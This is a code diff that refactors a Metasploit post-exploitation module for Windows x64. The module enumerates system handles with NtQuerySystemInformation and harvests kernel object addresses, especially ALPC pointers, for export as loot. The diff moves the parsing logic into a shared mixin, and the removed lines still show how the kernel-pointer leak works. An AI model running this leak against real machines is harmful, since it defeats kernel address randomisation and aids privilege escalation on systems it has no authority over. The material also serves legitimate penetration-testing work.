@@ -3,10 +3,13 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'msf/core/exploit/local/windows_kernel/handle_enum'
+
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Process
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Local::WindowsKernel::HandleEnum
 
   def initialize(info = {})
     super(
@@ -36,7 +39,7 @@ class MetasploitModule < Msf::Post
     register_options([
       OptInt.new('MAX_HANDLES', [true, 'Maximum handles to process (0 = unlimited)', 50000]),
       OptInt.new('TIMEOUT', [true, 'Timeout in seconds for enumeration', 30]),
-      OptString.new('EXPORT_CSV', [false, 'Export results to CSV file', nil])
+      OptString.new('EXPORT_CSV', [false, 'Export results to CSV file'])
     ])
   end
 
@@ -51,7 +54,7 @@ class MetasploitModule < Msf::Post
 
     print_status('Enumerating kernel object pointers...')
 
-    @pointers = enumerate_pointers
+    @pointers = enum_system_handles(session, datastore['MAX_HANDLES'], datastore['TIMEOUT'])
 
     if @pointers.nil? || @pointers.empty?
       print_error('Failed to enumerate kernel pointers')
@@ -66,150 +69,27 @@ class MetasploitModule < Msf::Post
   end
 
   def validate_environment
-    sysinfo = session.sys.config.sysinfo
-    @os = sysinfo['OS']
-    @arch = sysinfo['Architecture']
-    @computer = sysinfo['Computer']
-
-    print_status("Target: #{@computer}")
-    print_status("OS: #{@os}")
-    print_status("Arch: #{@arch}")
-    print_status("User: #{session.sys.config.getuid}")
-
-    unless @arch =~ /x64|64|amd64/i
-      print_error('This module only supports x64 systems')
-      return false
-    end
-
-    true
-  rescue StandardError => e
-    print_error("Failed to get system info: #{e.message}")
-    false
-  end
-
-  def enumerate_pointers
-    pointers = []
-    max_attempts = 5
-    attempt = 0
-    buffer_size = 1024 * 1024
-
     begin
-      Timeout.timeout(datastore['TIMEOUT']) do
-        while attempt < max_attempts
-          print_status("Attempt #{attempt + 1}: Trying buffer size #{buffer_size} bytes")
+      sysinfo = session.sys.config.sysinfo
+      @os = sysinfo['OS']
+      @arch = sysinfo['Architecture']
+      @computer = sysinfo['Computer']
 
-          begin
-            buffer = "\x00" * buffer_size
-          rescue ArgumentError
-            print_error("Failed to allocate buffer of size #{buffer_size}")
-            return nil
-          end
+      print_status("Target: #{@computer}")
+      print_status("OS: #{@os}")
+      print_status("Arch: #{@arch}")
+      print_status("User: #{session.sys.config.getuid}")
 
-          result = session.railgun.ntdll.NtQuerySystemInformation(64, buffer, buffer_size, 4)
-
-          if result.nil?
-            print_error('NtQuerySystemInformation returned nil')
-            return nil
-          end
-
-          if result['return'] == 0
-            print_good("Success with buffer size #{buffer_size}")
-            data = result['SystemInformation']
-            break
-          elsif result['return'] == 0xC0000004
-            if result['ReturnLength'] && result['ReturnLength'] > buffer_size
-              buffer_size = result['ReturnLength']
-              print_status("Buffer too small, need #{buffer_size} bytes")
-            else
-              buffer_size *= 2
-              print_status("Doubling buffer to #{buffer_size} bytes")
-            end
-            attempt += 1
-          else
-            print_error("NtQuerySystemInformation failed: 0x#{result['return'].to_s(16)}")
-            return nil
-          end
-        end
-
-        if attempt >= max_attempts
-          print_error("Failed to get valid buffer after #{max_attempts} attempts")
-          return nil
-        end
-
-        if data.nil? || data.length < 16
-          print_error('Invalid response data')
-          return nil
-        end
-
-        num_handles = data[0, 8].unpack('Q').first
-        print_good("System has #{num_handles} total handles")
-
-        max_handles = datastore['MAX_HANDLES']
-        if max_handles > 0 && num_handles > max_handles
-          print_status("Limiting to #{max_handles} handles")
-          num_handles = max_handles
-        end
-
-        print_status("Processing #{num_handles} handles...")
-
-        offset = 16
-        entry_size = 48
-
-        processed = 0
-        kernel_pointers = 0
-
-        num_handles.times do |i|
-          entry_offset = offset + (i * entry_size)
-          break if entry_offset + entry_size > data.length
-
-          entry = data[entry_offset, entry_size]
-
-          begin
-            object_ptr = entry[0, 8].unpack('Q').first
-            pid = entry[8, 8].unpack('Q').first
-            handle = entry[16, 8].unpack('Q').first
-            access = entry[24, 4].unpack('V').first
-            type_idx = entry[30, 2].unpack('v').first
-
-            if kernel_address?(object_ptr)
-              pointers << {
-                address: object_ptr,
-                pid: pid,
-                handle: handle,
-                access: access,
-                type_index: type_idx
-              }
-              kernel_pointers += 1
-            end
-
-            processed += 1
-
-            if processed % 10000 == 0
-              print_status("  Processed #{processed}/#{num_handles} handles (found #{kernel_pointers} kernel addresses)...")
-            end
-          rescue StandardError => e
-            vprint_error("Error parsing handle #{i}: #{e.message}")
-          end
-        end
-
-        print_good("Processed #{processed} handles, found #{kernel_pointers} kernel addresses")
+      unless @arch =~ /x64|64|amd64/i
+        print_error('This module only supports x64 systems')
+        return false
       end
-    rescue Timeout::Error
-      print_error("Enumeration timed out after #{datastore['TIMEOUT']} seconds")
-      return nil
+
+      true
     rescue StandardError => e
-      print_error("Error during enumeration: #{e.message}")
-      return nil
+      print_error("Failed to get system info: #{e.message}")
+      false
     end
-
-    pointers
-  end
-
-  def kernel_address?(addr)
-    return false if addr.nil? || addr == 0
-
-    high_bits = (addr >> 48) & 0xFFFF
-    high_bits == 0xFFFF
   end
 
   def display_results
@@ -253,7 +133,7 @@ class MetasploitModule < Msf::Post
 
       print_line("\n  Processes with ALPC pointers:")
       by_pid.sort_by { |_, v| -v.size }.first(10).each do |pid, ptrs|
-        proc_name = get_process_name(pid)
+        proc_name = get_process_name(session, pid)
         print_line("    #{proc_name} (PID: #{pid}): #{ptrs.size} ALPC pointers")
       end
 
@@ -264,44 +144,6 @@ class MetasploitModule < Msf::Post
     end
 
     print_line("\n" + '=' * 80)
-  end
-
-  def get_type_hint(type_idx)
-    hints = {
-      7 => 'Process',
-      8 => 'Thread',
-      16 => 'Key',
-      24 => 'File',
-      32 => 'ALPC',
-      33 => 'ALPC',
-      34 => 'ALPC',
-      35 => 'ALPC Port',
-      36 => 'ALPC Port',
-      37 => 'ALPC Port',
-      38 => 'ALPC Port',
-      39 => 'ALPC Port',
-      40 => 'ALPC Port',
-      41 => 'ALPC Port',
-      42 => 'ALPC Section',
-      43 => 'ALPC',
-      44 => 'ALPC',
-      45 => 'ALPC',
-      46 => 'ALPC',
-      47 => 'ALPC',
-      48 => 'ALPC'
-    }
-    hints[type_idx] || 'Unknown'
-  end
-
-  def get_process_name(pid)
-    begin
-      session.sys.process.each_process do |p|
-        return p['name'] if p['pid'] == pid
-      end
-    rescue ::StandardError
-      nil
-    end
-    "PID:#{pid}"
   end
 
   def export_results
@@ -316,14 +158,7 @@ class MetasploitModule < Msf::Post
       csv += "#{p[:pid]},#{p[:type_index]},#{type_hint},0x#{p[:handle].to_s(16)},0x#{p[:access].to_s(8)},0x#{p[:address].to_s(16)}\n"
     end
 
-    csv_size = csv.bytesize
-    size_str = if csv_size < 1024
-                 "#{csv_size} bytes"
-               elsif csv_size < 1024 * 1024
-                 "#{(csv_size / 1024.0).round(2)} KB"
-               else
-                 "#{(csv_size / (1024.0 * 1024.0)).round(2)} MB"
-               end
+    size_str = format_file_size(csv.bytesize)
 
     stored_path = store_loot(
       'windows.kernel.pointers',
